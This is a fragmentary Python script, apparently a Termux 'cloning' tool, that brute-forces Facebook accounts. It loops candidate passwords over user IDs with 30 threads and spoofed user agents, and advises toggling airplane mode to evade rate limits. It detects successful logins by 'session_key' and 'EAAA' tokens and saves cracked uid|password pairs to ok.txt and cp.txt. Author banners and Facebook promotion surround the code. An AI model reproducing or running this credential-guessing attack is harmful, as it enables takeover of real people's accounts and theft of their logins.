...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m SHAYAN KHAN\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :7.6.0\x1b[0m\x1b[1;97m] \033[1;37m 
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m ALWAYS ON TOP\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :7.6.0\x1b[0m\x1b[1;97m] \033[1;37m 

 ───────────────────────────────────────────────────────×

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : SHaYaNXSuLeMaN \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : TERMUX-SHaYaN\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook :SHaYaN.KhaN  \x1b[0m\x1b[1;97m]
...
def helpnote()
	...
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/banrd/SK/main/sk.txt"])

	#yahan apni facebook id link dalna

	exit(" [=>] FACEBOOK :  https://www.facebook.com/SHaYaNoHaRaMi007")
...
def notice():
	...
	runtxt("\n\033[0;97m 2009 CLONING TOOL FOLLOW MY FB FOR APPROVA")

	os.system("xdg-open https://www.facebook.com/SHaYaNoHaRaMi007")

	runtxt("\033[0;97m FOLLOW ME ON FB FOR APPROVAL  >> %s%s"%(G,basesplit))

	runtxt("\033[0;97m COPY YOUR KEY AND SEND ME INBOX")

	os.system("xdg-open https://www.facebook.com/SHaYaNoHaRaMi007")

	subprocess.check_output(["am", "start", "https://www.facebook.com/SHaYaNoHaRaMi007"])
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m AUTHER   : SHaYaNXSuLeMaN \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m FOLLOW ME ON FACEBOOK\x1b[0m\x1b[1;97m] \033[1;37m ")
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : FUCK YOUR SYSTEM")

				print("\033[0;92m[=×>]\033[0;92m NOTE : AIRPLAN MOD/FLIGHT MOD ON  AFTER EVERY 10 MINT ")
...
'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=SHAYAN=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=SHAYAN=OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [=SHAYAN=CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [=SHAYAN=CP=>]  %s|%s\n"%(uid, pw))
 ...
 #SHaYaN copy krke apna name dal dyna
